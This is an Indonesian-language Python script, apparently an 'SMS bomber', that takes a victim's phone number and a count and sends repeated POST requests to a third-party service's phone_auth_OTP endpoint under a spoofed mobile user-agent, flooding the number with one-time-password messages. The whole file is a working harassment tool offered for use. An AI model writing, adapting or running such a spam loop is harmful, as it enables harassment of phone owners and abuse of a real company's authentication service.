#======================================#
'''
   Author : Endin Aenudin
   Social ;
            Github    : /vpVai
            Youtube   : vp vai.Offical
            Instagram : vp vai
'''
#======================================#

'''

	Pake aja gan ..
	Itung-itung Buat Lu Belajar
	Biar Gak Recode Script Orang Mulu!!!
	Jan Lupa Tinggalkan Jejak ogehh!
	Apa Aja Jejak Nya lah Seterah

'''



#__Module
import os,sys,requests,time

os.system("clear") #__ClearScreen
#__BannerStyle
banner = """\033[97m
 ███████\033[91m╗\033[97m███████\033[91m╗ \033[94m╽ \033[41m \033[97mN O  S Y S T E M  I S  S A F E \033[0m
\033[97m ██\033[91m╔══\033[97m██\033[91m║\033[97m██\033[91m╔════╝ \033[94m║ \033[91m╾\033[97m───────────────────\033[91m╼
 \033[97m███████\033[91m║\033[97m███████\033[91m╗ \033[94m║    \033[0;92mAuthor  \033[93m: \033[90mUgex.
\033[91m ╚════\033[97m██\033[91m║╚════\033[97m██\033[91m║ \033[94m║    \033[90;92mYoutube \033[93m: \033[90mDin-zUgex95
\033[97m ███████\033[91m║\033[97m███████\033[91m║ \033[94m║    \033[0;92mGithub  \033[93m: \033[90m./Din-zUgex95
\033[91m ╚══════╝╚══════╝ \033[94m╿ \033[91m╾\033[97m──────────────────────────────\033[91m╼
"""

#__TeksRun
def tulis(oo):
	for ii in oo + '\n':
		sys.stdout.write(ii)
		sys.stdout.flush()
		time.sleep(0.0002)

#__Repeat
def ulang_():
	print("  \033[94m[\033[92mo\033[94m] \033[97mSelesai\033[92m ~")
	o = input("   \033[97mUlang Lagi\033[91m? \033[94m(\033[90my\033[91m/\033[90mt\033[94m) \033[91m≽\033[93m ")
	if o=='y':
		run()
	elif o=='t':
		os.system("xdg-open https://youtube.com/Din-zUgex95")
		exit("\n  \033[94m[ \033[97mExit \033[94m]\n\n")
		time.sleep(1)
	else:
		os.system("xdg-open https://youtube.com/Din-zUgex95")
		exit("\n  \033[94m[ \033[97mKesalahan \033[94m]\n\n")
		time.sleep(1)


def run():
	os.system("clear")
	time.sleep(0.3)
	tulis(banner)
	time.sleep(0.5) #__SleepTime

	no = input("  \033[94m[\033[91mx\033[94m] \033[97mNomor  \033[91m≽\033[93m ") #__InputNumberPhone
	jml = int(input("  \033[94m[\033[91mx\033[94m] \033[97mJumlah \033[91m≽\033[93m ")) #__AmountSpam

	print("\n \033[91m╾\033[97m─────────────────────────────────────\033[91m╼ ")
	time.sleep(0.6)
	#__Data
	aku = {
		'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36'
	}
	kamu = {
		'phone': no
	}
	a=0
	for sayang in range(jml):
		a+=1
		x = requests.post('https://api.harnicid.com/phone_auth_OTP', headers=aku, data=kamu)
		if 'erro' in x.text:
			print('  \033[94m[\033[93m',a,'\033[94m]\033[97m',no,'\033[94m|| \033[91mFailed \033[94m||')
		else:
			print('  \033[94m[\033[93m',a,'\033[94m]\033[97m',no,'\033[94m|| \033[92mSuccess \033[94m||')
	print(" \033[91m╾\033[97m─────────────────────────────────────\033[91m╼ ")
	time.sleep(1)
	print("  \033[92m~                            \033[94m[ \033[90mDONE \033[94m] ")
	print("")
	ulang_()
	print("\033[97m")
	#______ D O N E _______________

run()
